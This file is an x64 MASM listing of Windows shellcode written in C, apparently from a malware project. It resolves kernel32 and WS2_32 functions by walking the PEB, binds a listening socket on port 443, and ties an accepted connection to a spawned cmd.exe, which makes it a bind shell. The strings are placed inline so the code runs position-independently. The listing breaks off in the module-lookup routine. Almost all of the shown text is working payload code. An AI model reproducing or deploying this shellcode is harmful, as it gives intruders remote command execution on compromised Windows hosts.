; Listing generated by Microsoft (R) Optimizing Compiler Version 19.32.31332.0 

include listing.inc

; INCLUDELIB LIBCMT
; INCLUDELIB OLDNAMES

PUBLIC	RtlSecureZeroMemory
PUBLIC	?get_module_by_name@@YAPEAXPEA_W@Z		; get_module_by_name
PUBLIC	?get_func_by_name@@YAPEAXPEAXPEAD@Z		; get_func_by_name
PUBLIC	?init_iat@@YA_NAEAUt_mini_iat@@@Z		; init_iat
PUBLIC	?init_socket_iat@@YA_NAEAUt_mini_iat@@AEAUt_socket_iat@@@Z ; init_socket_iat
PUBLIC	main
;	COMDAT pdata
;	COMDAT pdata
;	COMDAT pdata
;	COMDAT xdata
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata
;	COMDAT xdata
; Function compile flags: /Odtp
PUBLIC  AlignRSP
_TEXT SEGMENT
	; AlignRSP - by @mattifestation (http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html)
	; AlignRSP is a simple call stub that ensures that the stack is 16 - byte aligned prior
	; to calling the entry point of the payload.This is necessary because 64 - bit functions
	; in Windows assume that they were called with 16 - byte stack alignment.When amd64
	; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
	; if your shellcode lands with 8 - byte stack alignment, any call to a Win32 function will likely
	; crash upon calling any ASM instruction that utilizes XMM registers(which require 16 - byte)
	; alignment.

	AlignRSP PROC
	push rsi; Preserve RSI since we're stomping on it
	mov  rsi, rsp; Save the value of RSP so it can be restored
	and  rsp, 0FFFFFFFFFFFFFFF0h; Align RSP to 16 bytes
	sub  rsp, 020h; Allocate homing space for ExecutePayload
	call main; Call the entry point of the payload
	mov  rsp, rsi; Restore the original value of RSP
	pop  rsi; Restore RSI
	ret; Return to caller
	AlignRSP ENDP
_TEXT ENDS

_TEXT	SEGMENT
result$ = 80
server_socket$ = 88
client_socket$ = 96
client_address_len$ = 104
address$ = 112
pi$ = 128
sIAT$ = 160
iat$ = 304
sui$ = 352
cmd$ = 464
client_address$ = 520
wsaData$ = 576
main	PROC
; File C:\Users\user\Desktop\Malware\Project1\Project1\Source3.cpp
; Line 121
$LN10:
	push	rsi
	push	rdi
	sub	rsp, 1000				; 000003e8H
; Line 123
	lea	rcx, QWORD PTR iat$[rsp]
	call	?init_iat@@YA_NAEAUt_mini_iat@@@Z	; init_iat
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN2@main
; Line 124
	mov	eax, 1
	jmp	$LN1@main
$LN2@main:
; Line 130
	lea	rax, QWORD PTR sui$[rsp]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 104				; 00000068H
	rep stosb
; Line 131
	lea	rax, QWORD PTR pi$[rsp]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 24
	rep stosb
; Line 134
	lea	rdx, QWORD PTR sIAT$[rsp]
	lea	rcx, QWORD PTR iat$[rsp]
	call	?init_socket_iat@@YA_NAEAUt_mini_iat@@AEAUt_socket_iat@@@Z ; init_socket_iat
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN3@main
; Line 135
	xor	eax, eax
	jmp	$LN1@main
$LN3@main:
; Line 139
	lea	rdx, QWORD PTR wsaData$[rsp]
	mov	cx, 514					; 00000202H
	call	QWORD PTR sIAT$[rsp]
	mov	DWORD PTR result$[rsp], eax
; Line 140
	cmp	DWORD PTR result$[rsp], 0
	je	SHORT $LN4@main
; Line 141
	mov	eax, 1
	jmp	$LN1@main
$LN4@main:
; Line 145
	mov	DWORD PTR [rsp+40], 0
	mov	DWORD PTR [rsp+32], 0
	xor	r9d, r9d
	mov	r8d, 6
	mov	edx, 1
	mov	ecx, 2
	call	QWORD PTR sIAT$[rsp+120]
	mov	QWORD PTR server_socket$[rsp], rax
; Line 146
	cmp	QWORD PTR server_socket$[rsp], -1
	jne	SHORT $LN5@main
; Line 148
	call	QWORD PTR sIAT$[rsp+104]
; Line 149
	mov	eax, 1
	jmp	$LN1@main
$LN5@main:
; Line 155
	mov	eax, 2
	mov	WORD PTR address$[rsp], ax
; Line 156
	xor	ecx, ecx
	call	QWORD PTR sIAT$[rsp+80]
	mov	DWORD PTR address$[rsp+4], eax
; Line 157
	mov	cx, 443					; 000001bbH
	call	QWORD PTR sIAT$[rsp+72]
	mov	WORD PTR address$[rsp+2], ax
; Line 162
	mov	r8d, 16
	lea	rdx, QWORD PTR address$[rsp]
	mov	rcx, QWORD PTR server_socket$[rsp]
	call	QWORD PTR sIAT$[rsp+24]
	mov	DWORD PTR result$[rsp], eax
; Line 163
	cmp	DWORD PTR result$[rsp], -1
	jne	SHORT $LN6@main
; Line 165
	mov	rcx, QWORD PTR server_socket$[rsp]
	call	QWORD PTR sIAT$[rsp+64]
; Line 166
	call	QWORD PTR sIAT$[rsp+104]
; Line 167
	mov	eax, 1
	jmp	$LN1@main
$LN6@main:
; Line 171
	mov	edx, 2147483647				; 7fffffffH
	mov	rcx, QWORD PTR server_socket$[rsp]
	call	QWORD PTR sIAT$[rsp+32]
	mov	DWORD PTR result$[rsp], eax
; Line 172
	cmp	DWORD PTR result$[rsp], -1
	jne	SHORT $LN7@main
; Line 174
	mov	rcx, QWORD PTR server_socket$[rsp]
	call	QWORD PTR sIAT$[rsp+64]
; Line 175
	call	QWORD PTR sIAT$[rsp+104]
; Line 176
	mov	eax, 1
	jmp	$LN1@main
$LN7@main:
; Line 180
	mov	DWORD PTR client_address_len$[rsp], 16
; Line 187
	lea	r8, QWORD PTR client_address_len$[rsp]
	lea	rdx, QWORD PTR client_address$[rsp]
	mov	rcx, QWORD PTR server_socket$[rsp]
	call	QWORD PTR sIAT$[rsp+40]
	mov	QWORD PTR client_socket$[rsp], rax
; Line 188
	cmp	QWORD PTR client_socket$[rsp], -1
	jne	SHORT $LN8@main
; Line 190
	mov	rcx, QWORD PTR server_socket$[rsp]
	call	QWORD PTR sIAT$[rsp+64]
; Line 191
	call	QWORD PTR sIAT$[rsp+104]
; Line 192
	mov	eax, 1
	jmp	$LN1@main
$LN8@main:
; Line 196
	mov	edx, 104				; 00000068H
	lea	rcx, QWORD PTR sui$[rsp]
	call	RtlSecureZeroMemory
; Line 197
	mov	DWORD PTR sui$[rsp], 104		; 00000068H
; Line 199
	mov	DWORD PTR sui$[rsp+60], 257		; 00000101H
; Line 200
	mov	rax, QWORD PTR client_socket$[rsp]
	mov	QWORD PTR sui$[rsp+80], rax
; Line 201
	mov	rax, QWORD PTR client_socket$[rsp]
	mov	QWORD PTR sui$[rsp+88], rax
; Line 202
	mov	rax, QWORD PTR client_socket$[rsp]
	mov	QWORD PTR sui$[rsp+96], rax
; Line 207
	lea	rax, QWORD PTR cmd$[rsp]
	CALL after_$SG108786
$SG108786 DB	'C', 00H, ':', 00H, '\', 00H, 'W', 00H, 'i', 00H, 'n', 00H
	DB	'd', 00H, 'o', 00H, 'w', 00H, 's', 00H, '\', 00H, 'S', 00H, 'y'
	DB	00H, 's', 00H, 't', 00H, 'e', 00H, 'm', 00H, '3', 00H, '2', 00H
	DB	'\', 00H, 'c', 00H, 'm', 00H, 'd', 00H, '.', 00H, 'e', 00H, 'x'
	DB	00H, 'e', 00H, 00H, 00H
after_$SG108786:
	POP  rcx

; 	lea	rcx, OFFSET FLAT:$SG108786
	mov	rdi, rax
	mov	rsi, rcx
	mov	ecx, 56					; 00000038H
	rep movsb
; Line 212
	lea	rax, QWORD PTR pi$[rsp]
	mov	QWORD PTR [rsp+72], rax
	lea	rax, QWORD PTR sui$[rsp]
	mov	QWORD PTR [rsp+64], rax
	mov	QWORD PTR [rsp+56], 0
	mov	QWORD PTR [rsp+48], 0
	mov	DWORD PTR [rsp+40], 16
	mov	DWORD PTR [rsp+32], 1
	xor	r9d, r9d
	xor	r8d, r8d
	CALL after_$SG108787
$SG108787 DB	'/', 00H, 'c', 00H, ' ', 00H, 'c', 00H, 'm', 00H, 'd', 00H
	DB	'.', 00H, 'e', 00H, 'x', 00H, 'e', 00H, 00H, 00H
after_$SG108787:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108787
	lea	rcx, QWORD PTR cmd$[rsp]
	call	QWORD PTR iat$[rsp+16]
; Line 223
	mov	edx, -1					; ffffffffH
	mov	rcx, QWORD PTR pi$[rsp]
	call	QWORD PTR iat$[rsp+32]
; Line 225
	mov	rcx, QWORD PTR pi$[rsp]
	call	QWORD PTR iat$[rsp+40]
; Line 226
	mov	rcx, QWORD PTR pi$[rsp+8]
	call	QWORD PTR iat$[rsp+40]
; Line 228
	mov	rcx, QWORD PTR server_socket$[rsp]
	call	QWORD PTR sIAT$[rsp+64]
; Line 229
	mov	rcx, QWORD PTR client_socket$[rsp]
	call	QWORD PTR sIAT$[rsp+64]
; Line 230
	call	QWORD PTR sIAT$[rsp+104]
; Line 231
	xor	eax, eax
$LN1@main:
; Line 232
	add	rsp, 1000				; 000003e8H
	pop	rdi
	pop	rsi
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
WS232_dll$ = 32
iat$ = 64
sIAT$ = 72
?init_socket_iat@@YA_NAEAUt_mini_iat@@AEAUt_socket_iat@@@Z PROC ; init_socket_iat
; File C:\Users\user\Desktop\Malware\Project1\Project1\Source3.cpp
; Line 97
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
; Line 98
	CALL after_$SG108729
$SG108729 DB	'WS2_32.dll', 00H
	ORG $+5
after_$SG108729:
	POP  rcx

; 	lea	rcx, OFFSET FLAT:$SG108729
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax]
	mov	QWORD PTR WS232_dll$[rsp], rax
; Line 100
	CALL after_$SG108730
$SG108730 DB	'WSAStartup', 00H
	ORG $+1
after_$SG108730:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108730
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx], rax
; Line 101
	CALL after_$SG108731
$SG108731 DB	'socket', 00H
	ORG $+5
after_$SG108731:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108731
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+8], rax
; Line 102
	CALL after_$SG108732
$SG108732 DB	'inet_addr', 00H
	ORG $+2
after_$SG108732:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108732
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+16], rax
; Line 103
	CALL after_$SG108733
$SG108733 DB	'bind', 00H
	ORG $+3
after_$SG108733:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108733
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+24], rax
; Line 104
	CALL after_$SG108734
$SG108734 DB	'listen', 00H
	ORG $+1
after_$SG108734:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108734
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+32], rax
; Line 105
	CALL after_$SG108735
$SG108735 DB	'accept', 00H
	ORG $+1
after_$SG108735:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108735
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+40], rax
; Line 106
	CALL after_$SG108736
$SG108736 DB	'recv', 00H
	ORG $+3
after_$SG108736:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108736
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+48], rax
; Line 107
	CALL after_$SG108737
$SG108737 DB	'send', 00H
	ORG $+7
after_$SG108737:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108737
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+56], rax
; Line 108
	CALL after_$SG108738
$SG108738 DB	'closesocket', 00H
after_$SG108738:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108738
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+64], rax
; Line 109
	CALL after_$SG108739
$SG108739 DB	'htons', 00H
	ORG $+2
after_$SG108739:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108739
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+72], rax
; Line 110
	CALL after_$SG108740
$SG108740 DB	'htonl', 00H
	ORG $+6
after_$SG108740:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108740
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+80], rax
; Line 111
	CALL after_$SG108741
$SG108741 DB	'getaddrinfo', 00H
	ORG $+4
after_$SG108741:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108741
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+88], rax
; Line 112
	CALL after_$SG108742
$SG108742 DB	'freeaddrinfo', 00H
	ORG $+3
after_$SG108742:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108742
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+96], rax
; Line 113
	CALL after_$SG108743
$SG108743 DB	'WSACleanup', 00H
	ORG $+5
after_$SG108743:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108743
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+104], rax
; Line 114
	CALL after_$SG108744
$SG108744 DB	'WSAConnect', 00H
	ORG $+5
after_$SG108744:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108744
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+112], rax
; Line 115
	CALL after_$SG108745
$SG108745 DB	'WSAAccept', 00H
	ORG $+6
after_$SG108745:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108745
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+128], rax
; Line 116
	CALL after_$SG108746
$SG108746 DB	'WSASocketA', 00H
	ORG $+5
after_$SG108746:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108746
	mov	rcx, QWORD PTR WS232_dll$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	mov	rcx, QWORD PTR sIAT$[rsp]
	mov	QWORD PTR [rcx+120], rax
; Line 117
	mov	al, 1
; Line 118
	add	rsp, 56					; 00000038H
	ret	0
?init_socket_iat@@YA_NAEAUt_mini_iat@@AEAUt_socket_iat@@@Z ENDP ; init_socket_iat
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
base$ = 32
create_proc$ = 40
load_lib$ = 48
get_proc$ = 56
wait_proc$ = 64
close_han$ = 72
exit_proc$ = 80
iat$ = 112
?init_iat@@YA_NAEAUt_mini_iat@@@Z PROC			; init_iat
; File C:\Users\user\Desktop\Malware\Project1\Project1\Source3.cpp
; Line 52
$LN10:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H
; Line 53
	CALL after_$SG108676
$SG108676 DB	'k', 00H, 'e', 00H, 'r', 00H, 'n', 00H, 'e', 00H, 'l', 00H
	DB	'3', 00H, '2', 00H, '.', 00H, 'd', 00H, 'l', 00H, 'l', 00H, 00H
	DB	00H
	ORG $+6
after_$SG108676:
	POP  rcx

; 	lea	rcx, OFFSET FLAT:$SG108676
	call	?get_module_by_name@@YAPEAXPEA_W@Z	; get_module_by_name
	mov	QWORD PTR base$[rsp], rax
; Line 54
	cmp	QWORD PTR base$[rsp], 0
	jne	SHORT $LN2@init_iat
; Line 55
	xor	al, al
	jmp	$LN1@init_iat
$LN2@init_iat:
; Line 58
	CALL after_$SG108678
$SG108678 DB	'LoadLibraryA', 00H
	ORG $+3
after_$SG108678:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108678
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR load_lib$[rsp], rax
; Line 59
	cmp	QWORD PTR load_lib$[rsp], 0
	jne	SHORT $LN3@init_iat
; Line 60
	xor	al, al
	jmp	$LN1@init_iat
$LN3@init_iat:
; Line 62
	CALL after_$SG108680
$SG108680 DB	'GetProcAddress', 00H
	ORG $+1
after_$SG108680:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108680
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR get_proc$[rsp], rax
; Line 63
	cmp	QWORD PTR get_proc$[rsp], 0
	jne	SHORT $LN4@init_iat
; Line 64
	xor	al, al
	jmp	$LN1@init_iat
$LN4@init_iat:
; Line 67
	CALL after_$SG108682
$SG108682 DB	'CreateProcessW', 00H
	ORG $+1
after_$SG108682:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108682
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR create_proc$[rsp], rax
; Line 68
	cmp	QWORD PTR create_proc$[rsp], 0
	jne	SHORT $LN5@init_iat
; Line 69
	xor	al, al
	jmp	$LN1@init_iat
$LN5@init_iat:
; Line 72
	CALL after_$SG108684
$SG108684 DB	'ExitProcess', 00H
	ORG $+4
after_$SG108684:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108684
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR exit_proc$[rsp], rax
; Line 73
	cmp	QWORD PTR exit_proc$[rsp], 0
	jne	SHORT $LN6@init_iat
; Line 74
	xor	al, al
	jmp	$LN1@init_iat
$LN6@init_iat:
; Line 77
	CALL after_$SG108686
$SG108686 DB	'WaitForSingleObject', 00H
	ORG $+4
after_$SG108686:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108686
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR wait_proc$[rsp], rax
; Line 78
	cmp	QWORD PTR wait_proc$[rsp], 0
	jne	SHORT $LN7@init_iat
; Line 79
	xor	al, al
	jmp	$LN1@init_iat
$LN7@init_iat:
; Line 82
	CALL after_$SG108688
$SG108688 DB	'CloseHandle', 00H
	ORG $+4
after_$SG108688:
	POP  rdx

; 	lea	rdx, OFFSET FLAT:$SG108688
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR close_han$[rsp], rax
; Line 83
	cmp	QWORD PTR close_han$[rsp], 0
	jne	SHORT $LN8@init_iat
; Line 84
	xor	al, al
	jmp	SHORT $LN1@init_iat
$LN8@init_iat:
; Line 87
	mov	rax, QWORD PTR iat$[rsp]
	mov	rcx, QWORD PTR load_lib$[rsp]
	mov	QWORD PTR [rax], rcx
; Line 88
	mov	rax, QWORD PTR iat$[rsp]
	mov	rcx, QWORD PTR get_proc$[rsp]
	mov	QWORD PTR [rax+8], rcx
; Line 89
	mov	rax, QWORD PTR iat$[rsp]
	mov	rcx, QWORD PTR create_proc$[rsp]
	mov	QWORD PTR [rax+16], rcx
; Line 90
	mov	rax, QWORD PTR iat$[rsp]
	mov	rcx, QWORD PTR create_proc$[rsp]
	mov	QWORD PTR [rax+24], rcx
; Line 91
	mov	rax, QWORD PTR iat$[rsp]
	mov	rcx, QWORD PTR wait_proc$[rsp]
	mov	QWORD PTR [rax+32], rcx
; Line 92
	mov	rax, QWORD PTR iat$[rsp]
	mov	rcx, QWORD PTR close_han$[rsp]
	mov	QWORD PTR [rax+40], rcx
; Line 93
	mov	al, 1
$LN1@init_iat:
; Line 94
	add	rsp, 104				; 00000068H
	ret	0
?init_iat@@YA_NAEAUt_mini_iat@@@Z ENDP			; init_iat
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_func_by_name@@YAPEAXPEAXPEAD@Z
_TEXT	SEGMENT
k$1 = 0
i$2 = 8
exp$ = 16
expAddr$ = 24
funcNamesListRVA$ = 28
namesOrdsListRVA$ = 32
funcsListRVA$ = 36
curr_name$3 = 40
idh$ = 48
exportsDir$ = 56
nt_headers$ = 64
namesCount$ = 72
nameIndex$4 = 80
nameRVA$5 = 88
funcRVA$6 = 96
module$ = 128
func_name$ = 136
?get_func_by_name@@YAPEAXPEAXPEAD@Z PROC		; get_func_by_name, COMDAT
; File C:\Users\user\Desktop\Malware\Project1\Project1\peb_lookup.h
; Line 67
$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
; Line 68
	mov	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR idh$[rsp], rax
; Line 69
	mov	rax, QWORD PTR idh$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN8@get_func_b
; Line 70
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN8@get_func_b:
; Line 72
	mov	rax, QWORD PTR idh$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR nt_headers$[rsp], rax
; Line 73
	mov	eax, 8
	imul	rax, rax, 0
	mov	rcx, QWORD PTR nt_headers$[rsp]
	lea	rax, QWORD PTR [rcx+rax+136]
	mov	QWORD PTR exportsDir$[rsp], rax
; Line 74
	mov	rax, QWORD PTR exportsDir$[rsp]
	cmp	DWORD PTR [rax], 0
	jne	SHORT $LN9@get_func_b
; Line 75
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN9@get_func_b:
; Line 78
	mov	rax, QWORD PTR exportsDir$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR expAddr$[rsp], eax
; Line 79
	mov	eax, DWORD PTR expAddr$[rsp]
	add	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR exp$[rsp], rax
; Line 80
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+24]
	mov	QWORD PTR namesCount$[rsp], rax
; Line 82
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+28]
	mov	DWORD PTR funcsListRVA$[rsp], eax
; Line 83
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+32]
	mov	DWORD PTR funcNamesListRVA$[rsp], eax
; Line 84
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+36]
	mov	DWORD PTR namesOrdsListRVA$[rsp], eax
; Line 87
	mov	QWORD PTR i$2[rsp], 0
	jmp	SHORT $LN4@get_func_b
$LN2@get_func_b:
	mov	rax, QWORD PTR i$2[rsp]
	inc	rax
	mov	QWORD PTR i$2[rsp], rax
$LN4@get_func_b:
	mov	rax, QWORD PTR namesCount$[rsp]
	cmp	QWORD PTR i$2[rsp], rax
	jae	$LN3@get_func_b
; Line 88
	mov	eax, DWORD PTR funcNamesListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR nameRVA$5[rsp], rax
; Line 89
	mov	eax, DWORD PTR namesOrdsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR nameIndex$4[rsp], rax
; Line 90
	mov	eax, DWORD PTR funcsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR nameIndex$4[rsp]
	movzx	ecx, WORD PTR [rcx]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR funcRVA$6[rsp], rax
; Line 92
	mov	rax, QWORD PTR nameRVA$5[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR curr_name$3[rsp], rax
; Line 94
	mov	QWORD PTR k$1[rsp], 0
	jmp	SHORT $LN7@get_func_b
$LN5@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	inc	rax
	mov	QWORD PTR k$1[rsp], rax
$LN7@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
; Line 95
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	mov	rcx, QWORD PTR k$1[rsp]
	mov	rdx, QWORD PTR curr_name$3[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	movsx	ecx, BYTE PTR [rcx]
	cmp	eax, ecx
	je	SHORT $LN10@get_func_b
	jmp	SHORT $LN6@get_func_b
$LN10@get_func_b:
; Line 96
	jmp	SHORT $LN5@get_func_b
$LN6@get_func_b:
; Line 97
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
; Line 99
	mov	rax, QWORD PTR funcRVA$6[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@get_func_b
$LN11@get_func_b:
; Line 101
	jmp	$LN2@get_func_b
$LN3@get_func_b:
; Line 102
	xor	eax, eax
$LN1@get_func_b:
; Line 103
	add	rsp, 120				; 00000078H
	ret	0
?get_func_by_name@@YAPEAXPEAXPEAD@Z ENDP		; get_func_by_name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_module_by_name@@YAPEAXPEA_W@Z
_TEXT	SEGMENT
i$1 = 0
tv141 = 8
tv160 = 10
curr_name$2 = 16
c1$3 = 24
c2$4 = 28
tv137 = 32
tv156 = 36
entry$5 = 40
current$6 = 48
head$ = 56
peb$ = 64
ldr$ = 72
module_name$ = 96
?get_module_by_name@@YAPEAXPEA_W@Z PROC			; get_module_by_name, COMDAT
; File C:\Users\user\Desktop\Malware\Project1\Project1\peb_lookup.h
; Line 29
$LN20:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H
; Line 32
	mov	rax, QWORD PTR gs:[96]
	mov	QWORD PTR peb$[rsp], rax
; Line 36
	mov	rax, QWORD PTR peb$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR ldr$[rsp], rax
; Line 38
	mov	rax, QWORD PTR ldr$[rsp]
	add	rax, 32					; 00000020H
